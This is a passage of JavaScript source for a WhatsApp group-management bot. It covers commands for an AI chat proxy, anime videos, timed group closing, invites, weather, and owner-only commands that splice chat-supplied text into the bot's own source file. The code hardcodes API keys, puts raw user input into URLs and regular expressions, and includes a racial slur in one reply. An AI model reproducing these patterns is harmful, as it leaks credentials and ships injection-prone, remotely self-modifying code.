                                        let teks = `Hi ðŸ‘‹\nWant to Buy Premium? Just chat with the Badboi or kings clan˜‰`;
                                        await bad.sendMessage(
                                            m.chat,
                                            {
                                                text: teks,
                                                contextInfo: {
                                                    externalAdReply: {
                                                        showAdAttribution: true,
                                                        title: `${botName}`,
                                                        body: `${creatorName}`,
                                                        thumbnailUrl:
                                                        "https://i.imgur.com/Bhex1tf.jpeg",
                                                        sourceUrl: global.link,
                                                        mediaType: 1,
                                                        renderLargerThumbnail: true
                                                    }
                                                }
                                            },
                                            {
                                                quoted: m
                                            }
                                        );
                                    }
                                    break
                                    
                                    case 'ai': {
                                    
                                    await loading()
                                        if (!text) return reply(`Example:  what is your name`);   
                                        try {
                                            let gpt = await (await fetch(`https://apiToxxicTechinc.vercel.app/api/chat?question=${text}&apikey=toxxicboy`)).json();
                                            await reply(gpt.data.response);
                                        } catch (error) {
                                            await reply('An error occurred, please try again later.');
                                        }
                                        
                                    }

                    break
                                case 'runtime':
                                
                                    await loading()
                                    let runtimetext = `*Bot Name* : ${global.botName}
                                    ┏━━━━━━━━━━━━━━━━━━
                                    ┃  ❖ 𝙷𝙴𝙻𝙻𝙾 @${sender.split("@")[0]}
                                    𝚁𝚄𝙽𝚃𝙸𝙼𝙴 : ${botName} Bots Have Been Running For ${runtime(
                                        process.uptime()
                                    )}`;
                                    bad.sendMessage(
                                        m.chat,
                                        {
                                            text: runtimetext,
                                            contextInfo: {
                                                externalAdReply: {
                                                    showAdAttribution: true,
                                                    title: `${botName}`,
                                                    body: `FORGET DONATE`,
                                                    thumbnailUrl:
                                                    "https://i.imgur.com/Bhex1tf.jpeg",
                                                    sourceUrl: global.link,
                                                    mediaType: 1,
                                                    renderLargerThumbnail: true
                                                }
                                            }
                                        },
                                        {
                                            quoted: m
                                        }
                                    );
                    break
                case 'animeku': {
                
                    await loading()
                        const dir = [
                            'https://telegra.ph/file/0d4fb93951c620aacb229.mp4',
                            'https://g.top4top.io/m_2391c90iu1.mp4',
                            'https://h.top4top.io/m_2391mfvy22.mp4',
                            'https://i.top4top.io/m_2391iwmee3.mp4',
                            'https://j.top4top.io/m_23915x5204.mp4',
                            'https://l.top4top.io/m_2391e795x5.mp4',
                            'https://a.top4top.io/m_2391jcee66.mp4',
                            'https://b.top4top.io/m_2391ho0bz7.mp4',
                            'https://c.top4top.io/m_23910hulw8.mp4',
                            'https://d.top4top.io/m_2391dj01a9.mp4',
                            'https://e.top4top.io/m_23912fdr210.mp4',
                            'https://a.top4top.io/m_23911dhqx1.mp4',
                            'https://b.top4top.io/m_2391wwr402.mp4',
                            'https://c.top4top.io/m_2391vfkp63.mp4',
                            'https://d.top4top.io/m_2391b7cey4.mp4',
                            'https://e.top4top.io/m_2391fxdc85.mp4',
                            'https://telegra.ph/file/c3deeb5b0b7f7738a95ad.mp4',
                            'https://telegra.ph/file/7ca9eef850f5edc53f7f2.mp4',
                            'https://telegra.ph/file/44f73812ae0c19f097264.mp4',
                            'https://telegra.ph/file/10399f910bb90de8a6c53.mp4',
                            'https://telegra.ph/file/f7b440b02e742d1d4bed6.mp4',
                            'https://telegra.ph/file/3571f86c9c8843f48ce03.mp4',
                            'https://telegra.ph/file/c0b4e700e2d696f6ae448.mp4',
                            'https://telegra.ph/file/c0b4e700e2d696f6ae448.mp4',
                            'https://telegra.ph/file/fbfa5ac6baca454de22ad.mp4',
                            'https://telegra.ph/file/899cb30e29de1f0692ea1.mp4',
                            'https://telegra.ph/file/30e226e2d30e51bda678f.mp4',
                            'https://telegra.ph/file/4b20016e2f4ff925470fea.mp4',
                            'https://telegra.ph/file/d48fde63f91f9aa585716.mp4',
                            'https://telegra.ph/file/3a1f2afb1172b4606cd50.mp4',
                            'https://telegra.ph/file/fe7de67cadcddf80e4f23.mp4',
                            'https://telegra.ph/file/f4eabe96d994b28b7020d.mp4',
                            'https://telegra.ph/file/f8adc8f3af8ce6f80254b.mp4',
                            'https://telegra.ph/file/909a4beb3be92dae9e8ef.mp4',
                            'https://telegra.ph/file/57dff983fe52d49cf9e11.mp4',
                            'https://telegra.ph/file/70ed984ecf1382e0e74ce.mp4',
                            'https://telegra.ph/file/a922d3d0214e7b95dfb89.mp4',
                            'https://telegra.ph/file/ff7a0e8598bfd47898932.mp4',
                            'https://telegra.ph/file/c992c64d4bb59df46f06e.mp4',
                            'https://telegra.ph/file/137346459c02371cf5de9.mp4',
                            'https://telegra.ph/file/2ae60a3fc1509f779cba0.mp4',
                            'https://telegra.ph/file/223ac432cbca27313c59c.mp4',
                            'https://telegra.ph/file/6411bbcedc5da320b8656.mp4',
                            'https://telegra.ph/file/33a005837185d86435a26.mp4',
                            'https://telegra.ph/file/3b5cf36d1fc154ee36345.mp4',
                            'https://telegra.ph/file/c5606fb2547f4c8268f1bb.mp4',
                            'https://telegra.ph/file/a91ba184bd2faedf2ca93.mp4',
                            'https://telegra.ph/file/aebad466be77f72498981.mp4',
                            'https://telegra.ph/file/a38ff1a80c53fb374af90.mp4',
                            'https://telegra.ph/file/607217019e1e5952920c1.mp4',
                            'https://telegra.ph/file/8a98532caa714b28acce1.mp4',
                            'https://telegra.ph/file/9eb4be5e79b7e71bfecc5.mp4',
                            'https://telegra.ph/file/10bbd3972f7b75a8b2ef6.mp4',
                            'https://telegra.ph/file/3fae1c6aacaba812ea651.mp4',
                            'https://telegra.ph/file/68378ab14e55b8a4113c2.mp4',
                            'https://telegra.ph/file/9cb140f6f74012cce30c7.mp4',
                            'https://telegra.ph/file/17a3d58921c2754cf86ef.mp4',
                            'https://telegra.ph/file/3ac2c8447b8915a879e7a.mp4',
                            'https://telegra.ph/file/269cd09dcf42f8bd3a6f9.mp4',
                            'https://telegra.ph/file/d2e59e56cfdaac79ca7f8.mp4',
                            'https://telegra.ph/file/504ac80844f99a8e3fc54.mp4',
                            'https://telegra.ph/file/dd2b8fba0010f539085d1.mp4',
                            'https://telegra.ph/file/af9726aad0dce10dc4529.mp4',
                            'https://telegra.ph/file/c693724dba3bb96bb6c70.mp4',
                            'https://telegra.ph/file/5b91438135d01c11e7c92.mp4',
                            'https://telegra.ph/file/d2a468ff7cd4c29dcdb4a.mp4',
                            'https://telegra.ph/file/9cc245954979317b3484c.mp4',
                            'https://telegra.ph/file/cde12f0fd2c73ab8eb933.mp4',
                            'https://telegra.ph/file/ab58119a87c7f2c2367dc.mp4',
                            'https://telegra.ph/file/9146e2d5490c1b01c6e87.mp4',
                            'https://telegra.ph/file/09c9e72d3e0d44175c304.mp4',
                            'https://telegra.ph/file/2f01ddd037c40477ed07f.mp4',
                            'https://telegra.ph/file/be72f95d92490f0a1db3b.mp4',
                            'https://telegra.ph/file/d1464f070543fb3aaeaee.mp4',
                            'https://telegra.ph/file/99f02aa82825f1bf61e9a.mp4',
                            'https://telegra.ph/file/d540762b1d4f9e767357d.mp4',
                            'https://telegra.ph/file/98d09d227e8552d4e2bea.mp4',
                            'https://telegra.ph/file/4a9dc4ba09484791dfa9a.mp4',
                            'https://telegra.ph/file/91d8701c2783775637125.mp4',
                        ]
                        await bad.sendMessage(m.chat, {
                            video: {
                                url: dir[Math.floor(Math.random() * dir.length)]
                            }, caption: `*_</> done. video anime by Scarlet_*`
                        }, {
                            quoted: m
                        })
                    }
break

case 'closegroup': {

if (!isGroup) return reply(`Use in Group Only`)
if (!isAdmins && !isOwner) return reply('ReverseKing or Admin Only')
if (!isBotAdmins) return reply(`Bots Are Not Stupid Admins`)
if (!args[0]) return reply(`*Select Time:*\n-second\n-minute\n-hour\n-day\n\n*Example:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Time starts from now*`)
setTimeout(() => {
var nomor = m.participant
bad.groupSettingUpdate(m.chat, 'announcement')
reply(`The Time Has Come!\nThe group was closed by a Reverse King because no one was maintaining the group\nThe group will be opened according to the time determined by ReverseKing`)
}, timer)
}
break

case 'opengroup': {

if (!isGroup) return reply(`Specifically For Group`)
if (!isAdmins && !isOwner) return reply('For Admin only')
if (!isBotAdmins) return reply(`Bots Are Not Stupid Admins`)
if (!args[0]) return reply(`*Select Time:*\n-second\n-minute\n-hour\n-day\n\n*Example:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Time starts from now*`)
setTimeout(() => {
var nomor = m.participant
bad.groupSettingUpdate(m.chat, 'not_announcement')
reply(`Nigga On Time The Group Has Been Open Now All Participants Can Send Messages`)
}, timer)
}
break

case "demote": {

               if (!isOwner) return reply("Certain User Specific Features!!")
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Not Admin :(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^ 0-9]/g, '')+'@s.whatsapp.net'
await bad.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case 'listonline': {

               if (!isOwner) return reply("Certain User Specific Features!!")
        if (!m.isGroup) return reply(mess.grouponly);
        bad.sendMessage(from, { react: { text: "👑", key: m.key } })
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
        let online = [...Object.keys(store.presences[id]), botNumber]
        let liston = 1
        bad.sendText(m.chat, '  「 *Online Members* 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
      }
      break
      
      
            case 'setname': case 'setsubject': {
            
               if (!isOwner) return reply("Certain User Specific Features!!")
              if (!m.isGroup) return reply(mess.grouponly);
              if (!isBotAdmins) return reply(mess.botadmin);
              bad.sendMessage(from, { react: { text: "👑 ", key: m.key } })
              if (!text) return reply('Pls enter .setname <New Group Name>  to change this Group Name')
              await bad.groupUpdateSubject(m.chat, text).then((res) => reply(mess.jobdone)).catch((err) => reply(jsonformat(err)))
            }
            break;
            
            
                  case 'inviteuser': {
                  
                    if (!m.isGroup) return reply(mess.grouponly);
                    if (!isBotAdmins) return reply(mess.botadmin);
                    bad.sendMessage(from, { react: { text: "👑 ", key: m.key } })
            
                    if (!text) return reply(`Enter the number you want to invite to the group...\n\nExample :\n*${prefix + command}* 233542680612`)
                    if (text.includes('+')) return reply(`Enter the number together without *+*`)
                    if (isNaN(text)) return reply(`Enter only the numbers plus your country code without spaces`)
                    let group = m.chat
                    let link = 'https://chat.whatsapp.com/' + await bad.groupInviteCode(group)
                    await bad.sendMessage(text + '@s.whatsapp.net', { text: ` *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender] })
                    reply(` An invite link is sent to the user`)
                  };
            break
            
            
                  case 'invite': case 'gclink': {
                  
               if (!isOwner) return reply("Certain User Specific Features!!")               
                    if (!m.isGroup) return reply(mess.grouponly);
                    if (!isBotAdmins) return reply(mess.botadmin);
                if (!isAdmins) return reply(mess.useradmin)
                    bad.sendMessage(from, { react: { text: "👑 ", key: m.key } })
                    let response = await bad.groupInviteCode(m.chat)
                    bad.sendMessage(m.chat, {
                      text: `*Group Name:* *${groupMetadata.subject}* \n\n*Group Link :* \nhttps://chat.whatsapp.com/${response}\n\n♱REVERSEKING-V1♱♡⃤`, "contextInfo": {
                        "forwardingScore": 1000000000,
                        isForwarded: true,
                      }
                    }, { quoted: m, detectLink: true })
                  }
                  break
                  
      case 'gitclone': 
      
               if (!isOwner) return reply("Certain User Specific Features!!")
        bad.sendMessage(from, { react: { text: "💫", key: m.key } });
        if (!args[0]) {
          return reply(`Please provide the GitHub repository link.\nExample:\n${prefix}${command} https://github.com/BADBOI-v1/BADBOI-v5`);
        }
        if (!isUrl(args[0]) || !args[0].includes('github.com')) {
          return reply(`Invalid or non-GitHub repository link provided. Please use a valid GitHub repository link.`);
        }
        try {
          let splitURL = args[0].split('github.com/');
          if (splitURL.length < 2) throw Error('Invalid GitHub URL');
          let [githubUser, githubRepo] = splitURL[1].split('/');
          githubRepo = githubRepo.replace('.git', '');
          let gitZipUrl = `https://api.github.com/repos/${githubUser}/${githubRepo}/zipball`;
          await bad.sendMessage(from, { text: `Please wait, downloading...` });
          let zipHeaders = await fetch(gitZipUrl, { method: 'HEAD' }).then(res => res.headers);
          let zipFilename = zipHeaders.get('content-disposition').match(/attachment; filename=(.*)/)[1];
          await bad.sendMessage(m.chat, { document: { url: gitZipUrl }, fileName: zipFilename + '.zip', mimetype: 'application/zip' }, { quoted: m });
        } catch (err) {
          console.error(err);
          return reply(`Failed to fetch the repository contents. Please ensure the GitHub link is correct and accessible. Use the format: 'https://github.com/username/repository'.`);
        }
        break
    
case 'promote': {

if (!isGroup) return reply('`Reverse King said its for Only Group`')
if (!isAdmins && !isOwner) return reply('`Reverse King said its for Only Admin`')
if (!isBotAdmins) return reply(`ReverseKing Admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await bad.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

// === Owner Menu

case 'addcase': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!text) return m.reply(`Example: ${prefix+command} the case`);
const namaFile = path.join(__dirname, '𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js');
const caseBaru = `${text}\n\n`;
const tambahCase = (data, caseBaru) => {
const posisiDefault = data.lastIndexOf("default:");
if (posisiDefault !== -1) {
const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Cannot find default case in file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('An error occurred while reading the file:', err);
return m.reply(`An error occurred while reading the file: ${err.message}`);
}
const result = tambahCase(data, caseBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('An error occurred while writing the file:', err);
return m.reply(`An error occurred while writing the file: ${err.message}`);
} else {
console.log('Successfully added a new case:');
console.log(caseBaru);
return m.reply('Successfully added case!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break

case 'delcase': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!text) return m.reply(`Example: ${prefix+command} nama case`);
const fs = require('fs').promises;
async function dellCase(filePath, caseNameToRemove) {
try {
let data = await fs.readFile(filePath, 'utf8');
const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
const modifiedData = data.replace(regex, '');
if (data === modifiedData) {
m.reply('Case not found or has been deleted.');
return;
}
await fs.writeFile(filePath, modifiedData, 'utf8');
m.reply('Successfully removed the case!');
} catch (err) {
m.reply(`There is an error: ${err.message}`);
}}
dellCase('./𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js', q);
break;
}

case 'getcase': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!text) return m.reply(`Example: ${prefix+command} 1 caseName atau ${prefix+command} 2 caseName1 caseName2`);
const modeRegex = /^([12])\s+(.+)$/;
const match = text.match(modeRegex);
if (!match) return m.reply(`Invalid format. Example: ${prefix+command} 1 caseName atau ${prefix+command} 2 caseName1 caseName2`);
const mode = parseInt(match[1], 10);
const caseNames = match[2].split(' ').map(name => name.trim()).filter(name => name);
if (mode === 1 && caseNames.length !== 1) {
return m.reply(`Untuk mode '1', masukkan satu case name. Example: ${prefix+command} 1 caseName`);
}
if (mode === 2 && (caseNames.length < 1 || caseNames.length > 2)) {
return m.reply(`Untuk mode '2', masukkan satu atau dua case names. Example: ${prefix+command} 2 caseName1 caseName2`);
}
const getCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return m.reply(`Case '${caseName}' not found.`);
}
return match[0];
} catch (error) {
return m.reply(`An error occurred while reading the file: ${error.message}`);
}};
const getCases = async (caseNames) => {
try {
const casePromises = caseNames.map(caseName => getCase(caseName));
const cases = await Promise.all(casePromises);
return cases.join('\n\n');
} catch (error) {
return m.reply(`There is an error: ${error.message}`);
}};

getCases(caseNames)
.then(caseCode => m.reply(caseCode))
.catch(error => m.reply(`There is an error: ${error.message}`));
break;
}

case 'cekcase': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!text) return m.reply(`Example: ${prefix+command} caseName`);
const caseName = text.trim();
if (!caseName) return m.reply(`Masukkan nama case yang ingin dicek. Example: ${prefix+command} caseName`);
const cekCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return { found: false };
}
const lines = fileContent.split('\n');
const caseLines = match[0].split('\n');
const startLine = lines.indexOf(caseLines[0]) + 1;
const endLine = startLine + caseLines.length - 1;
return {
found: true,
startLine,
endLine,
content: match[0]
};
} catch (error) {
return { error: `An error occurred while reading the file: ${error.message}` };
}};
const result = await cekCase(caseName);
if (result.error) {
m.reply(result.error);
} else if (result.found) {
const message = `
*CASE DITEMUKAN!*
• Nama Case: ${caseName}
• Baris Awal: ${result.startLine}
• Baris Akhir: ${result.endLine}

I'd like to take it too?`;
let kon = `{\"display_text\":\"YA\",\"id\":\"${prefix}getcase 1 ${text}\"}`
quickreply1(m.chat, message, kon, m)
userSessions[m.sender] = { caseToRetrieve: result, caseName };
} else {
m.reply(`Case '${caseName}' not found.`);
}
break;
}

case 'listcase': {
if (!isOwner) return reply("Certain User Specific Features!!")
let { listCase } = require('./Badboi/listcase.js')
m.reply(listCase())
}
break

case 'weather': {

if (!isOwner) return reply("Certain User Specific Features!!")
if (!text) return reply ('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

          bad.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break

case 'addfunc':
case 'addfunction': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!text) return m.reply(`Example: ${prefix+command} function new`);
const namaFile = path.join(__dirname, '𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js');
const functionBaru = `${text}\n\n`;
const tambahFunction = (data, functionBaru) => {
const posisiButtonUrl = data.indexOf("function buttonurl");
if (posisiButtonUrl !== -1) {
const kodeBaruLengkap = data.slice(0, posisiButtonUrl) + functionBaru + data.slice(posisiButtonUrl);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Cannot find function buttonurl in file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('An error occurred while reading the file:', err);
return m.reply(`An error occurred while reading the file: ${err.message}`);
}
const result = tambahFunction(data, functionBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('An error occurred while writing the file:', err);
return m.reply(`An error occurred while writing the file: ${err.message}`);
} else {
console.log('Successfully added a new function:');
console.log(functionBaru);
return m.reply('Successfully added function!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break;

case 'delfunc':
case 'delfunction': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!text) return m.reply(`Example: ${prefix+command} functionName`);
const isValidFunctionName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const deleteFunction = (functionName) => {
if (!isValidFunctionName(functionName)) return m.reply(`Invalid function name: ${functionName}`);
try {
const fileContent = fs.readFileSync("./𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js", "utf8");
const functionRegex = new RegExp(`function\\s+${functionName}\\s*\\([^)]*\\)\\s*{`, "g");
const match = functionRegex.exec(fileContent);
if (!match) return m.reply(`Fungsi ${functionName} not found`);
const functionStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;
let functionEnd;

for (let i = functionStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') inString = !inString;
if (!inString) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
}}
if (braceCount === 0 && currentChar === '}') {
functionEnd = i + 1;
break;
}
prevChar = currentChar;
}
if (functionEnd === undefined) return m.reply(`Fungsi ${functionName} tidak lengkap atau kurung kurawal tidak seimbang`);
const updatedContent = fileContent.slice(0, functionStart) + fileContent.slice(functionEnd);
fs.writeFileSync("./𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js", updatedContent, "utf8");
return m.reply(`Fungsi ${functionName} telah dihapus`);
} catch (err) {
return m.reply(`There is an error: ${err.message}`);
}};
m.reply(deleteFunction(q));
}
break

case 'getfunc':
case 'getfunction': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!text) return m.reply(`Example: ${prefix+command} functionName`);
const isValidFunctionName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const getFunction = (functionName) => {
if (!isValidFunctionName(functionName)) return m.reply(`Invalid function name: ${functionName}`);
try {
const fileContent = fs.readFileSync("./𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js", "utf8");

const functionRegex = new RegExp(`function\\s+${functionName}\\s*\\([^)]*\\)\\s*{`, "g");
const match = functionRegex.exec(fileContent);
if (!match) return m.reply(`Function ${functionName} not found`);

const functionStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;
for (let i = functionStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') inString = !inString;
if (!inString) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
}}
if (braceCount === 0 && currentChar === '}') {
const functionEnd = i + 1;
const functionContent = fileContent.slice(functionStart, functionEnd);
return functionContent;
}
prevChar = currentChar;
}} catch (err) {
return m.reply(`There is an error: ${err.message}`);
}}  
m.reply(`${getFunction(q)}`);
}
break

case 'cekfunc':
case 'cekfunction': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!text) return m.reply(`Example: ${prefix+command} functionName`);
const functionName = text.trim();
if (!functionName) return m.reply(`Enter the name of the function you want to check. Example: ${prefix+command} functionName`);
const cekFunction = async (functionName) => {
try {
const fileContent = await fs.promises.readFile("./𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js", "utf-8");
const functionRegex = new RegExp(`function ${functionName}\\s*\\([\\s\\S]*?\\)\\s*\\{[\\s\\S]*?\\}`, 'g');
const match = fileContent.match(functionRegex);
if (!match) {
return { found: false };
}
const lines = fileContent.split('\n');
const functionLines = match[0].split('\n');
const startLine = lines.indexOf(functionLines[0]) + 1;
const endLine = startLine + functionLines.length - 1;
return {
found: true,
startLine,
endLine,
content: match[0]
};
} catch (error) {
return { error: `An error occurred while reading the file: ${error.message}` };
}};
const result = await cekFunction(functionName);
if (result.error) {
m.reply(result.error);
} else if (result.found) {
const message = `
*FUNCTION FOUND!*
• Function name: ${functionName}
• Initial line: ${result.startLine}
• Final row: ${result.endLine}

I'd like to take it too?`;
let kun = `{\"display_text\":\"YA\",\"id\":\"${prefix}getfunc ${text}\"}`
quickreply1(m.chat, message, kun, m)
userSessions[m.sender] = { functionToRetrieve: result, functionName };
} else {
m.reply(`Function '${functionName}' not found.`);
}
break;
}

case 'addlet': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!text) return m.reply(`Example: ${prefix+command} let new`);
const namaFile = path.join(__dirname, '𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js');
const letBaru = `${text}\n\n`;
const tambahLet = (data, letBaru) => {
const posisiContacts = data.indexOf("const contacts");
if (posisiContacts !== -1) {
const kodeBaruLengkap = data.slice(0, posisiContacts) + letBaru + data.slice(posisiContacts);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Cannot find const contacts in file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('An error occurred while reading the file:', err);
return m.reply(`An error occurred while reading the file: ${err.message}`);
}
const result = tambahLet(data, letBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('An error occurred while writing the file:', err);
return m.reply(`An error occurred while writing the file: ${err.message}`);
} else {
console.log('Successfully added new let:');
console.log(letBaru);
return m.reply('Sukses menambahkan let!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break

case 'updatesc': {

let teks = `*UPDATE SCRIPT SCARLET*

*UPDATE SINCE :*
*${penghitung}🥵*
*CLOCK :*
*${jam}🥵*

*UPDATE SCRIPT UNCERTAIN SCRIPT!*`
reply(teks)
}
break

case 'dellet': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!text) return m.reply(`Example: ${prefix+command} letVariableName`);
const isValidVariableName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const deleteLet = (variableName) => {
if (!isValidVariableName(variableName)) return m.reply(`Invalid variable name: ${variableName}`);
try {
const fileContent = fs.readFileSync("./𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js", "utf8");
const letRegex = new RegExp(`\\blet\\s+${variableName}\\s*=\\s*([^;]+);`, "g");
const match = letRegex.exec(fileContent);
if (!match) return m.reply(`Variabel ${variableName} not found`);

const variableStart = match.index;
const variableEnd = variableStart + match[0].length;
const updatedContent = fileContent.slice(0, variableStart) + fileContent.slice(variableEnd);
fs.writeFileSync("./𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js", updatedContent, "utf8");
return m.reply(`Variabel ${variableName} telah dihapus`);
} catch (err) {
return m.reply(`There is an error: ${err.message}`);
}};
m.reply(deleteLet(q));
}
break

case 'getlet': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!text) return m.reply(`Example: ${prefix+command} letName`);
const isValidVariableName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const getLet = (letName) => {
if (!isValidVariableName(letName)) return m.reply(`Invalid variable name: ${letName}`);
try {
const fileContent = fs.readFileSync("./𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js", "utf8");
const letRegex = new RegExp(`let\\s+${letName}\\s*=`, "g");
const match = letRegex.exec(fileContent);

if (!match) return m.reply(`Variable ${letName} not found`);
const letStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;

for (let i = letStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') {
if (inString && currentChar === inString) {
inString = false;
} else if (!inString) {
inString = currentChar;
}}
if (!inString && !inComment) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
if (currentChar === ';' && braceCount === 0) {
const letEnd = i + 1;
const letContent = fileContent.slice(letStart, letEnd);
return letContent;
}}}
prevChar = currentChar;
}} catch (err) {
return m.reply(`There is an error: ${err.message}`);
}}
m.reply(`${getLet(q)}`);
}
break

case 'addconst': {

if (!isOwner) return reply("Special Features for Certain Users!!")
if (!text) return m.reply(`Example: ${prefix+command} const new`);
const namaFile = path.join(__dirname, '𝙎𝘾𝘼𝙍𝙇𝙀𝙏 𝙑5.js');
const constBaru = `${text}\n\n`;
const tambahConst = (data, constBaru) => {
const posisiIsAntiLink = data.indexOf("const isAntiLink");
if (posisiIsAntiLink !== -1) {
const kodeBaruLengkap = data.slice(0, posisiIsAntiLink) + constBaru + data.slice(posisiIsAntiLink);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Cannot find const isAntiLink in file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('An error occurred while reading the file:', err);
return m.reply(`An error occurred while reading the file: ${err.message}`);
}
const result = tambahConst(data, constBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('An error occurred while writing the file:', err);
return m.reply(`An error occurred while writing the file: ${err.message}`);
} else {
console.log('Successfully added const new:');
console.log(constBaru);
return m.reply('Successfully added const!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break
